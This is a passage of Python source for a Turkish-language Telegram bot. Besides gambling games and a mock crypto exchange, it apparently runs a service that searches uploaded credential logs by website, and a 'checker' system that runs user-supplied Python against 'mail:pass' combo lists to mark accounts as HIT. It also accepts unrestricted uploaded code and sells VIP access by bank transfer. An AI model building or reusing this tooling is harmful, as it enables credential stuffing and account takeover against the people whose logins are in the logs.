    wheel_last[user_id] = today
    if reward > 0:
      user_balances[user_id] = user_balances.get(user_id, 0) + reward
    save_data()
    bot.send_message(chat_id, f"🎡 **{label}**\n💵 Bakiye: **{user_balances.get(user_id, 0):.2f} TL**", parse_mode="Markdown")
    return

  elif call.data == "menu_karadelik":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🕳 5 TL at", callback_data="karadelik_at"))
    markup.add(types.InlineKeyboardButton("🎲 Kasayı patlat (admin)", callback_data="karadelik_patlat") if user_id in admin_ids_set else types.InlineKeyboardButton("🔙", callback_data="menu_sosyal"))
    if user_id not in admin_ids_set:
      markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_sosyal"))
    bot.send_message(
      chat_id,
      f"🕳 **Karadelik Kasası**\nHavuz: **{float(globals().get('blackhole_pot') or 0):.2f} TL**\n"
      f"Katılan: **{len(blackhole_players)}**\n"
      f"5 TL at · admin patlatınca random biri alır",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "karadelik_at":
    safe_answer()
    if user_balances.get(user_id, 0) < 5:
      bot.send_message(chat_id, "Yetersiz bakiye (5 TL).")
      return
    user_balances[user_id] = user_balances.get(user_id, 0) - 5
    globals()["blackhole_pot"] = float(globals().get("blackhole_pot") or 0) + 5
    if user_id not in blackhole_players:
      blackhole_players.append(user_id)
    save_data()
    bot.send_message(chat_id, f"✅ 5 TL atıldı.\nHavuz: **{globals().get('blackhole_pot', 0):.2f} TL**", parse_mode="Markdown")
    return

  elif call.data == "karadelik_patlat":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    if not blackhole_players or float(globals().get("blackhole_pot") or 0) <= 0:
      bot.send_message(chat_id, "Havuz boş.")
      return
    winner = random.choice(list(blackhole_players))
    pot = float(globals().get("blackhole_pot") or 0)
    user_balances[winner] = user_balances.get(winner, 0) + pot
    globals()["blackhole_pot"] = 0.0
    blackhole_players.clear()
    save_data()
    bot.send_message(chat_id, f"💥 Kasa patladı! Kazanan `{winner}` → **{pot:.2f} TL**", parse_mode="Markdown")
    try:
      bot.send_message(winner, f"🕳 Karadelik kazandın: **+{pot:.2f} TL**", parse_mode="Markdown")
    except Exception:
      pass
    return

  elif call.data == "menu_borsa":
    safe_answer()
    prices = fetch_crypto_prices()
    pf = stock_portfolio.get(user_id) or {}
    bal = get_norm_bal(user_id)
    port_v = crypto_portfolio_value(user_id, prices)
    lines = [
      "╔══════════════════════╗",
      "║  📈  KRİPTO BORSA    ║",
      "╚══════════════════════╝",
      "Gerçek fiyat · sanal TL",
      "",
      f"💵 Nakit    **{bal:.2f} TL**",
      f"💼 Portföy  **{port_v:.2f} TL**",
      f"📊 Toplam   **{bal + port_v:.2f} TL**",
      f"💳 Komisyon %{int(CRYPTO_FEE*100)} · ~2 dk cache",
      "",
      "────── Piyasa ──────",
    ]
    for sym, pr in prices.items():
      amt = float(pf.get(sym) or 0)
      prs = f"{pr:,.4f}" if pr < 100 else f"{pr:,.2f}"
      bar = "🟢" if amt > 0 else "⚪"
      lines.append(f"{bar} **{sym}**  `{prs}` TL")
      if amt > 0:
        lines.append(f"    └ `{amt:.8f}` ≈ **{amt*pr:.2f} TL**")
    markup = types.InlineKeyboardMarkup(row_width=2)
    for sym in prices:
      markup.add(
        types.InlineKeyboardButton(f"🟢 Al {sym}", callback_data=f"crypto_buy_{sym}"),
        types.InlineKeyboardButton(f"🔴 Sat {sym}", callback_data=f"crypto_sell_{sym}"),
      )
    markup.add(types.InlineKeyboardButton("🔄 Fiyat yenile", callback_data="menu_borsa"))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_sosyal"))
    bot.send_message(chat_id, "\n".join(lines), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("crypto_buy_"):
    safe_answer()
    sym = call.data.replace("crypto_buy_", "", 1)
    if sym not in CRYPTO_COINS:
      bot.send_message(chat_id, "Coin yok.")
      return
    crypto_pending[chat_id] = {"side": "buy", "sym": sym}
    user_states[chat_id] = "waiting_crypto_amount"
    pr = fetch_crypto_prices().get(sym, 0)
    bot.send_message(
      chat_id,
      f"🟢 **{sym} al**\nFiyat: **{pr:,.4f} TL**\n"
      f"Kaç **TL**'lik almak istiyorsun?\n"
      f"Bakiyen: **{get_norm_bal(user_id):.2f} TL**\n/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data.startswith("crypto_sell_"):
    safe_answer()
    sym = call.data.replace("crypto_sell_", "", 1)
    pf = stock_portfolio.get(user_id) or {}
    amt = float(pf.get(sym) or 0)
    if amt <= 0:
      bot.send_message(chat_id, "Elinde yok.")
      return
    crypto_pending[chat_id] = {"side": "sell", "sym": sym}
    user_states[chat_id] = "waiting_crypto_amount"
    pr = fetch_crypto_prices().get(sym, 0)
    bot.send_message(
      chat_id,
      f"🔴 **{sym} sat**\nElinde: `{amt:.8f}` ≈ **{amt*pr:.2f} TL**\n"
      f"Kaç **TL**'lik satmak istiyorsun? (hepsi için `all`)\n/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data == "menu_metin":
    safe_answer()
    user_states[chat_id] = "waiting_text_tool"
    bot.send_message(chat_id, "🔤 Metni gönder:\n• büyük/küçük\n• satır sayısı\n• tekrarları sil\n(otomatik işlenir)")
    return

  elif call.data == "menu_duello":
    safe_answer()
    user_states[chat_id] = "waiting_duel_bet"
    bot.send_message(chat_id, "⚔️ 1v1 bahis miktarı yaz (normal bakiye).\nEşleşince random kazanır.\n/iptal")
    return

  elif call.data == "menu_log":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    markup.add(
      types.InlineKeyboardButton("⚡ Kısa arama (Shard)", callback_data="log_mode_short"),
      types.InlineKeyboardButton("🔎 Uzun arama (Tüm txt)", callback_data="log_mode_long"),
    )
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    cd = get_log_cooldown_left(user_id)
    if user_id in admin_ids_set:
      hak_txt = "👑 Admin — ücretsiz · bekleme yok"
    elif cd > 0:
      hak_txt = (
        f"🆓 **Ücretsiz log**\n"
        f"⏳ Bekleme: **{format_cooldown(cd)}** kaldı\n"
        f"(Her arama arası **3 dakika**)"
      )
    else:
      hak_txt = (
        f"🆓 **Ücretsiz log**\n"
        f"✅ Şu an arayabilirsin\n"
        f"⏳ Her arama sonrası **3 dakika** bekleme"
      )
    log_menu_txt = (
      f"📋 **LOG SORGULAMA**\n\n"
      f"{hak_txt}\n\n"
      f"⚡ **Kısa:** sadece shard (hızlı)\n"
      f"🔎 **Uzun:** tüm txt loglar (yavaş, kapsamlı)\n\n"
      f"Sonuç: 2 dosya (CLEAN + RAW)"
    )
    try:
      bot.edit_message_text(
        log_menu_txt,
        chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
      )
    except Exception:
      try:
        bot.send_message(chat_id, log_menu_txt, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass
    return

  elif call.data == "log_mode_short":
    safe_answer()
    user_states[chat_id] = "waiting_log_search_short"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Log menü", callback_data="menu_log"))
    bot.send_message(
      chat_id,
      "⚡ **Kısa arama (Shard)**\n\n"
      "Sadece shard dosyalarına bakılır — hızlı.\n"
      "Aranacak siteyi yaz:\n"
      "`amazon.com.tr`",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "log_mode_long":
    safe_answer()
    user_states[chat_id] = "waiting_log_search_long"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Log menü", callback_data="menu_log"))
    bot.send_message(
      chat_id,
      "🔎 **Uzun arama (Tüm txt)**\n\n"
      "urls.txt + tüm log dosyaları taranır — yavaş ama kapsamlı.\n"
      "Aranacak siteyi yaz:\n"
      "`amazon.com.tr`",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "menu_my_bot":
    safe_answer()
    info = user_bot_tokens.get(user_id) or {}
    paid = bool(info.get("paid")) or (user_id in admin_ids_set)
    markup = types.InlineKeyboardMarkup()
    if not paid:
      markup.add(types.InlineKeyboardButton(f"⭐ {int(globals().get('MYBOT_STAR_COST', 50))} Yıldız ile aç", callback_data="mybot_pay"))
    else:
      markup.add(types.InlineKeyboardButton("➕ Token ekle / değiştir", callback_data="mybot_add_token"))
      if info.get("token"):
        markup.add(types.InlineKeyboardButton("✏️ Bot adı (marka)", callback_data="mybot_set_brand"))
        markup.add(types.InlineKeyboardButton("▶️ Botumu başlat", callback_data="mybot_start"))
        markup.add(types.InlineKeyboardButton("⏹ Botumu durdur", callback_data="mybot_stop"))
        markup.add(types.InlineKeyboardButton("🗑 Token sil", callback_data="mybot_del"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    un = info.get("username") or "-"
    st = "kayıtlı" if info.get("token") else ("ödeme OK — token bekleniyor" if paid else "kapalı")
    bot.send_message(
      chat_id,
      f"🤖 **Kendi botunu bağla**\n\n"
      f"Ücret: **{MYBOT_STAR_COST} Telegram Yıldızı** (tek seferlik)\n"
      f"• Ayrı database (ana botla karışmaz)\n"
      f"• Marka adı değiştirilebilir\n"
      f"• Ana sahip kilitli admin\n\n"
      f"Durum: **{st}**\n"
      f"Bot: @{un}\n"
      f"Marka: **{(info.get('brand') or 'CHK BOT')}**",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "mybot_pay":
    safe_answer()
    info = user_bot_tokens.get(user_id) or {}
    if info.get("paid") or user_id in admin_ids_set:
      bot.send_message(chat_id, "✅ Zaten açık — token ekleyebilirsin.")
      return
    send_mybot_star_invoice(chat_id, user_id, MYBOT_STAR_COST)
    return

  elif call.data == "mybot_set_brand":
    safe_answer()
    if not (user_bot_tokens.get(user_id) or {}).get("token"):
      bot.send_message(chat_id, "❌ Önce token ekle.")
      return
    user_states[chat_id] = "waiting_my_bot_brand"
    bot.send_message(chat_id, "✏️ Bot adını yaz (max 32). Örn: SHADOW CHK")
    return

  elif call.data == "mybot_add_token":
    safe_answer()
    info = user_bot_tokens.get(user_id) or {}
    if not (info.get("paid") or user_id in admin_ids_set):
      bot.send_message(chat_id, f"❌ Önce **{MYBOT_STAR_COST}⭐** ile hakkı aç.\n🤖 Bot Token menüsünden öde.", parse_mode="Markdown")
      return
    user_states[chat_id] = "waiting_my_bot_token"
    bot.send_message(chat_id, "🤖 Bot tokenini gönder.\nÖrn: `123456:AAH...`\n\n/iptal ile vazgeç.", parse_mode="Markdown")
    return

  elif call.data == "mybot_start":
    safe_answer()
    info = user_bot_tokens.get(user_id) or {}
    tok = info.get("token")
    if not tok:
      bot.send_message(chat_id, "❌ Önce token ekle.")
      return
    ok, res = start_user_bot_process(user_id, tok, brand=(info.get("brand") or "CHK BOT"))
    if ok:
      bot.send_message(chat_id, f"✅ Botun başlatıldı (PID {res}).\n@{info.get('username','?')} artık online olmalı.")
    else:
      bot.send_message(chat_id, f"❌ Başlatılamadı: {res}")
    return

  elif call.data == "mybot_stop":
    safe_answer()
    pid = child_bot_procs.get(user_id)
    if not pid:
      bot.send_message(chat_id, "⚠️ Bu oturumda çalışan alt bot yok (veya zaten kapalı).")
      return
    try:
      os.kill(pid, 15)
      child_bot_procs.pop(user_id, None)
      bot.send_message(chat_id, "⏹ Bot durduruldu.")
    except Exception as e:
      bot.send_message(chat_id, f"❌ Durdurulamadı: {e}")
    return

  elif call.data == "mybot_del":
    safe_answer()
    pid = child_bot_procs.pop(user_id, None)
    if pid:
      try:
        os.kill(pid, 15)
      except Exception:
        pass
    user_bot_tokens.pop(user_id, None)
    save_data()
    bot.send_message(chat_id, "🗑 Token silindi.")
    return

  elif call.data == "admin_add_log_urls":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    cur_sz = get_urls_log_size()
    user_states[chat_id] = "waiting_admin_log_urls"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ İptal", callback_data="menu_admin"))
    bot.send_message(
      chat_id,
      "📎 **LOG URL EKLE**\n\n"
      "• Metin olarak **birden fazla satır** yapıştırabilirsiniz (her satır 1 kayıt)\n"
      "• Veya **.txt dosyası** gönderin (tek veya birden fazla dosya üst üste)\n\n"
      f"📦 Mevcut boyut: **{format_bytes(cur_sz)}**\n"
      f"📏 Üst limit: **Yok** (istediğin kadar ekle)\n"
      f"📎 Telegram tek dosya max: **{format_bytes(MAX_UPLOAD_LOG_BYTES)}**\n"
      f"💡 100MB+ için: `log_inbox/` klasörüne at → **İçe Aktar**\n\n"
      "Örnek metin:\n```\namazon.com.tr\ntrendyol.com\nhepsiburada.com\n```",
      reply_markup=markup,
      parse_mode="Markdown"
    )
    return

  elif call.data == "admin_shard_stats":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    bot.send_message(chat_id, "📊 " + shard_stats_text(), parse_mode="Markdown")

  elif call.data == "admin_build_shards":
    if user_id not in admin_ids_set:
      return
    safe_answer("Index başlıyor...")
    bot.send_message(
      chat_id,
      "⚡ **Shard index başlıyor**\n"
      "Büyük loglarda uzun sürebilir. Bitince haber veririm.\n"
      "Bu sırada bot çalışmaya devam eder.",
      parse_mode="Markdown",
    )

    def _job():
      try:
        ensure_log_shards_dir()
        files = []
        if os.path.isfile(URLS_LOG_FILE):
          files.append(URLS_LOG_FILE)
        else:
          try:
            for f in list_searchable_log_files():
              if LOG_SHARDS_DIR in os.path.abspath(f):
                continue
              files.append(f)
              if len(files) >= 3:
                break
          except Exception:
            pass
        if not files:
          bot.send_message(chat_id, "❌ Indexlenecek log yok (urls.txt).")
          return
        total_r = total_w = 0
        for i, fp in enumerate(files, 1):
          try:
            bot.send_message(
              chat_id,
              f"⚡ HIZLI index {i}/{len(files)}: `{os.path.basename(fp)[:40]}` ({format_bytes(os.path.getsize(fp))})\nBuffer mod — az mesaj, cok hizli.",
              parse_mode="Markdown",
            )
          except Exception:
            pass
          def _cb(r, w, _i=i, _n=len(files)):
            if r and r % 2_000_000 == 0:
              try:
                bot.send_message(chat_id, f"… {_i}/{_n} · {r:,} okundu · {w:,} yazildi")
              except Exception:
                pass
          r, w = index_file_into_shards(fp, progress_cb=_cb)
          total_r += r
          total_w += w
        bot.send_message(
          chat_id,
          f"✅ **Shard index bitti (hizli)**\n"
          f"📖 Okunan: **{total_r:,}**\n"
          f"✍️ Yazilan: **{total_w:,}**\n"
          f"{shard_stats_text()}",
          parse_mode="Markdown",
        )
      except Exception as e:
        log_error("admin_build_shards", e)
        try:
          bot.send_message(chat_id, f"❌ Index hatasi: {e}")
        except Exception:
          pass

    threading.Thread(target=_job, daemon=True).start()

  elif call.data == "admin_import_log_inbox":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer("İçe aktarılıyor...")
    ensure_log_inbox_dirs()
    pending = list_log_inbox_files()
    if not pending:
      abs_inbox = os.path.abspath(LOG_INBOX_DIR)
      bot.send_message(
        chat_id,
        f"📭 **`{LOG_INBOX_DIR}/` boş**\n\n"
        f"1️⃣ Botun çalıştığı klasöre git\n"
        f"2️⃣ `{LOG_INBOX_DIR}` klasörüne 100MB+ `.txt` loglarını kopyala\n"
        f"3️⃣ Bu butona tekrar bas\n\n"
        f"📁 Tam yol:\n`{abs_inbox}`\n\n"
        f"İşlenen dosyalar otomatik `log_inbox/done/` altına taşınır.\n"
        f"urls.txt limiti: **Yok** (istediğin kadar)",
        parse_mode="Markdown"
      )
      return
    bot.send_message(
      chat_id,
      f"⏳ **{len(pending)} dosya** işleniyor...\nBu işlem büyük dosyalarda biraz sürebilir.",
      parse_mode="Markdown"
    )
    result = import_log_inbox(move_done=True)
    log_activity("log_inbox_import", user_id, f"ok={result['files_ok']} lines={result['lines_added']}")
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("📥 Tekrar İçe Aktar", callback_data="admin_import_log_inbox"),
      types.InlineKeyboardButton("📋 Log Listesi", callback_data="admin_list_log_urls"),
      types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"),
    )
    text = result["message"]
    if len(text) > 4000:
      text = text[:3900] + "\n\n... (kısaltıldı)"
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_log_size":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    sz = get_urls_log_size()
    inbox_files = list_log_inbox_files()
    inbox_total = 0
    inbox_lines = []
    for p in inbox_files:
      try:
        ps = os.path.getsize(p)
        inbox_total += ps
        inbox_lines.append(f"• `{os.path.basename(p)}` → **{format_bytes(ps)}**")
      except Exception:
        pass
    total = sz + inbox_total
    def _breakdown(n):
      return (
        f"• `{n:,}` byte\n"
        f"• `{(n/1024):.2f}` KB\n"
        f"• `{(n/(1024*1024)):.2f}` MB\n"
        f"• `{(n/(1024*1024*1024)):.4f}` GB"
      )
    text = (
      f"📊 **LOG BOYUTU**\n\n"
      f"📦 **urls.txt:** {format_bytes(sz)}\n"
      f"{_breakdown(sz) if sz else '• 0 B'}\n\n"
      f"📥 **Arama kaynakları (inbox):** {format_bytes(inbox_total)}\n"
      f"Dosya sayısı: **{len(inbox_files)}**\n"
    )
    if inbox_lines:
      text += "\n".join(inbox_lines[:15]) + "\n"
    text += f"\n📊 **Toplam taranabilir:** **{format_bytes(total)}**"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🔄 Yenile", callback_data="admin_log_size"),
      types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"),
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass
    return

  elif call.data == "admin_list_log_urls":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    admin_file = URLS_LOG_FILE
    sz = get_urls_log_size()
    if not os.path.exists(admin_file) or sz == 0:
      bot.send_message(chat_id, "📭 `urls.txt` boş / yok.\n📦 Boyut: **0 B**", parse_mode="Markdown")
      return
    count, approx = count_urls_log_lines()
    count_txt = f"~{count:,} (tahmini)" if approx else f"{count:,}"
    preview_lines = []
    try:
      with open(admin_file, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
          s = ln.strip()
          if s:
            preview_lines.append(s)
          if len(preview_lines) >= 25:
            break
    except Exception:
      pass
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🗑️ Tüm Logları Temizle", callback_data="admin_clear_log_urls"),
      types.InlineKeyboardButton("📥 urls.txt İndir", callback_data="admin_download_log_urls"),
      types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"),
    )
    preview = "\n".join(preview_lines)
    extra = f"\n\n... (önizleme: ilk {len(preview_lines)} satır)" if count > len(preview_lines) or approx else ""
    sz_mb = sz / (1024 * 1024)
    sz_gb = sz / (1024 * 1024 * 1024)
    size_detail = f"**{format_bytes(sz)}**"
    if sz_gb >= 0.01:
      size_detail += f"  ({sz_mb:.2f} MB / {sz_gb:.3f} GB)"
    elif sz_mb >= 0.01:
      size_detail += f"  ({sz_mb:.2f} MB)"
    bot.send_message(
      chat_id,
      f"📋 **LOG DURUMU**\n\n"
      f"📦 Boyut: {size_detail}\n"
      f"📄 Satır: **{count_txt}**\n"
      f"📁 Dosya: `{URLS_LOG_FILE}`\n"
      f"📥 Inbox bekleyen: **{len(list_log_inbox_files())}** dosya\n\n"
      f"```\n{preview or '(boş)'}{extra}\n```",
      reply_markup=markup,
      parse_mode="Markdown"
    )
    return

  elif call.data == "admin_clear_log_urls":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    old_sz = get_urls_log_size()
    with open(URLS_LOG_FILE, "w", encoding="utf-8") as f:
      f.write("")
    safe_answer("Temizlendi!", show_alert=True)
    bot.send_message(
      chat_id,
      f"🗑️ `urls.txt` temizlendi.\n📦 Silinen boyut: **{format_bytes(old_sz)}**",
      parse_mode="Markdown"
    )
    log_activity("log_clear", user_id, f"urls.txt was {old_sz}")
    return

  elif call.data == "admin_download_log_urls":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    if not os.path.exists(URLS_LOG_FILE) or os.path.getsize(URLS_LOG_FILE) == 0:
      bot.send_message(chat_id, "📭 Dosya boş.")
      return
    sz = get_urls_log_size()
    with open(URLS_LOG_FILE, "rb") as doc:
      bot.send_document(chat_id, doc, caption=f"📎 urls.txt ({format_bytes(sz)})")
    return

  elif call.data == "menu_vip_market":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, item in vip_market_data.items():
      markup.add(types.InlineKeyboardButton(f"💳 {item['name']} - {item['price']} TL", callback_data=f"buy_vip_{key}"))
    markup.add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))
    try: bot.edit_message_text(t(user_id, "vip_market_title"), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data.startswith("buy_vip_"):
    item_key = call.data.split("_", 2)[2]
    if item_key not in vip_market_data:
      safe_answer("❌ Ürün bulunamadı!", show_alert=True)
      return
    item = vip_market_data[item_key]
    safe_answer()
    order_id = str(uuid.uuid4())[:8]
    pending_vip_orders[order_id] = {'user_id': user_id, 'item_name': item['name'], 'price': item['price']}
    user_states[chat_id] = "waiting_vip_payment_proof"
    save_data()
    bot.send_message(chat_id, f"⭐ Ürün: **{item['name']}** ({item['price']} TL)\n⭐ Sipariş ID: `{order_id}`\nIBAN: `TR84 0086 9000 0000 0370 2055 15`\n📸 Ödeme dekontunu gönderin.", parse_mode="Markdown")

  elif call.data == "menu_kumar_v2":
    safe_answer()
    bot.send_message(chat_id, "🎰 Mini App kaldırıldı.\nKumar menüsünden oyna.")
    return

  elif call.data == "menu_notifs":
    safe_answer()
    mark_notifs_read(user_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    bot.send_message(chat_id, notif_center_text(user_id), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "menu_tournament":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Kumar", callback_data="menu_gambling"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    bot.send_message(chat_id, tournament_panel_text(), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "gamble_history":
    safe_answer()
    hist = get_gamble_history(user_id, 15)
    if not hist:
      bot.send_message(chat_id, "📜 Kumar geçmişin boş — oyna!")
      return
    lines = ["📜 **Kumar geçmişi** (son 15)\n"]
    for h in reversed(hist):
      d = float(h.get("delta") or 0)
      sign = "+" if d >= 0 else ""
      lines.append(f"• {h.get('game')} | bahis {h.get('bet')} | {h.get('result')} | {sign}{d:.1f} · _{h.get('time')}_")
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="menu_gambling"))
    bot.send_message(chat_id, "\n".join(lines)[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("bal_hist_"):
    safe_answer()
    kind = call.data.replace("bal_hist_", "") or "all"
    hist = filter_balance_history(user_id, kind, 20)
    title = {"all": "Tümü", "market": "Market", "gamble": "Kumar", "admin": "Admin/Bonus", "other": "Diğer"}.get(kind, kind)
    lines = [f"💳 **Bakiye geçmişi — {title}**\n"]
    if not hist:
      lines.append("_Kayıt yok._")
    for h in reversed(hist):
      lines.append(f"• `{h.get('type')}` {h.get('amount'):+.2f} — {h.get('note','')} · _{h.get('time')}_")
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
      types.InlineKeyboardButton("Tümü", callback_data="bal_hist_all"),
      types.InlineKeyboardButton("Market", callback_data="bal_hist_market"),
      types.InlineKeyboardButton("Kumar", callback_data="bal_hist_gamble"),
    )
    markup.add(
      types.InlineKeyboardButton("Admin", callback_data="bal_hist_admin"),
      types.InlineKeyboardButton("Diğer", callback_data="bal_hist_other"),
      types.InlineKeyboardButton("🔙", callback_data="menu_bakiye"),
    )
    bot.send_message(chat_id, "\n".join(lines)[:4000], reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_py_upload":
    if user_id not in admin_ids_set:
      safe_answer("Sadece admin", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_admin_py_file"
    bot.send_message(
      chat_id,
      "👑 **Admin PY Ekle** (onay yok — direkt menü)\n\n"
      "1) `.py` dosyası gönder **veya** kodu yapıştır\n"
      "2) Sonra menü adını yazacağız\n\n"
      "/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data == "cchk_upload":
    safe_answer()
    user_states[chat_id] = "waiting_custom_chk_py"
    bot.send_message(
      chat_id,
      "🐍 **Kendi Checker PY**\n\n"
      "• Dosya: `.py` — istediğin kod/kütüphane, **kısıt yok**\n"
      "• Çalışması için önerilen:\n"
      "`def check(user, password):`\n"
      "  `return (True/False, status, detail)`\n\n"
      "Örnek:\n"
      "```python\n"
      "def check(user, password):\n"
      "    if user and password:\n"
      "        return True, 'HIT', 'ok'\n"
      "    return False, 'BAD', ''\n"
      "```\n\n"
      "Yükleyince **anlık sana (admin) onay** gider — sen incelersin.\n"
      "Onaylanırsa Checker menüsüne eklenir.\n"
      "Onay öncesi sadece yükleyen test eder.\n\n"
      "📎 `.py` dosyası gönder **veya** kodu yapıştır\n/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data == "cchk_my_pending":
    safe_answer()
    mine = [(cid, m) for cid, m in custom_checkers_pending.items() if int(m.get("author_id") or 0) == int(user_id)]
    approved = [(cid, m) for cid, m in custom_checkers.items() if int(m.get("author_id") or 0) == int(user_id)]
    lines = ["📋 **PY Checker durumun**\n"]
    if mine:
      lines.append("⏳ Onay bekleyen:")
      for cid, m in mine:
        lines.append(f"• `{cid}` {m.get('name')} — {m.get('time')}")
    else:
      lines.append("⏳ Bekleyen yok.")
    if approved:
      lines.append("\n✅ Onaylı (menüde):")
      for cid, m in approved:
        lines.append(f"• `{cid}` {m.get('name')} · kullanım {m.get('uses',0)}")
    markup = types.InlineKeyboardMarkup()
    for cid, m in mine:
      markup.add(types.InlineKeyboardButton(f"🧪 Test: {m.get('name')}", callback_data=f"tool_cchk_test_{cid}"))
    markup.add(types.InlineKeyboardButton("🔙 Checker", callback_data="menu_checker"))
    bot.send_message(chat_id, "\n".join(lines), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("tool_cchk_test_"):
    safe_answer()
    cid = call.data.replace("tool_cchk_test_", "")
    meta = custom_checkers_pending.get(cid) or custom_checkers.get(cid)

    admin_temp_data[chat_id] = {"cchk_id": cid, "cchk_private": True}
    user_states[chat_id] = "waiting_cchk_combo"
    bot.send_message(chat_id, "🐍 Test combo gönder (mail:pass satır satır)\n/iptal")
    return

  elif call.data and call.data.startswith("tool_cchk_"):
    safe_answer()
    if not require_checker_sub(chat_id, user_id):
      return
    cid = call.data.replace("tool_cchk_", "")
    if cid not in custom_checkers:
      bot.send_message(chat_id, "❌ Checker yok veya pasif.")
      return
    meta = custom_checkers[cid]
    if meta.get("private"):
      if user_id not in admin_ids_set and int(meta.get("author_id") or 0) != int(user_id):
        bot.send_message(chat_id, "🔒 Bu checker sadece admin kullanımı için.")
        return
    admin_temp_data[chat_id] = {"cchk_id": cid, "cchk_private": bool(meta.get("private"))}
    user_states[chat_id] = "waiting_cchk_combo"
    priv = "🔒 Sadece sen/admin\n" if meta.get("private") else ""
    bot.send_message(
      chat_id,
      f"🐍 **{meta.get('name')}**\n{priv}{meta.get('desc') or ''}\n\n"
      f"Combo gönder (`mail:pass` satır satır) veya 📎 .txt\n/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data and call.data.startswith("cchk_approve_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_approve_", "")
    if cid not in custom_checkers_pending:
      bot.send_message(chat_id, "❌ Bu talep yok / zaten işlendi.")
      return
    pend = custom_checkers_pending[cid]
    admin_temp_data[chat_id] = {"cchk_approve_cid": cid}
    user_states[chat_id] = "waiting_cchk_menu_name"
    bot.send_message(
      chat_id,
      f"📝 Menüye eklenecek **iş/ad** yaz\n"
      f"ID: `{cid}` · yükleyen: `{pend.get('author_id')}`\n"
      f"Dosya adı: `{pend.get('name')}`\n\n"
      f"Örnek: `Hotmail Checker` veya `N11 Live`\n"
      f"İstersen ikinci satıra kısa açıklama da yaz.\n"
      f"/iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data and call.data.startswith("cchk_reject_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_reject_", "")
    ok, msg = reject_custom_checker(cid, user_id)
    bot.send_message(chat_id, "🗑 Reddedildi." if ok else f"❌ {msg}")
    return

  elif call.data and call.data.startswith("cchk_preview_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_preview_", "")
    meta = custom_checkers_pending.get(cid) or custom_checkers.get(cid)
    if not meta:
      bot.send_message(chat_id, "❌ Yok")
      return
    fp = meta.get("file")
    try:
      with open(fp, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()[:3500]
      bot.send_message(chat_id, f"👁 `{cid}`\n```python\n{src}\n```", parse_mode="Markdown")
    except Exception as e:
      bot.send_message(chat_id, f"❌ {e}")
    return

  elif call.data == "cchk_admin_manage":
